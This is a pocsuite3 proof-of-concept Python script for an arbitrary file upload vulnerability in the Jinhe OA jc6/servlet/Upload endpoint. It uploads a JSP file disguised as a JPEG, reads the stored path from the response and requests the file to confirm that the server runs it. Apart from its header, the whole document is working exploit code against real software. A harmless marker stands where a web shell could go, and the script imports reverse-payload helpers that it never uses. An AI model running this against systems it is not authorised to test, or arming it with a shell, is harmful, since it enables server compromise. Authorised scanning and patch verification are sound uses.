# _*_ coding:utf-8 _*_
# @Time : 2024/1/16
# @Author: 炼金术师诸葛亮
import re
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class jinhe_jc6_upload(POCBase):
    pocDesc = '''金和OA jc6/servlet/Upload接口任意文件上传漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-16'
    name = '金和OA jc6/servlet/Upload接口任意文件上传漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/'
        check_path = self.url+ "/test.aspx"
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            "Content-Type": "multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d"
        }

        try:
            data = '--ee055230808ca4602e92d0b7c4ecc63d\r\nContent-Disposition: form-data; name="img"; filename="1.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<% out.println("tteesstt1"); %>\r\n--ee055230808ca4602e92d0b7c4ecc63d--'

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200 and 'upload' in response.text:
                rtext=response.text
                path = re.search(r"arr\[2]='(.*?)'", rtext)
                if path:
                    check_path = self.url+ '/jc6/' +path.group(1)
                    check_response = requests.get(check_path)
                    if check_response.status_code == 200 and 'tteesstt1' in check_response.text:
                        result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(jinhe_jc6_upload)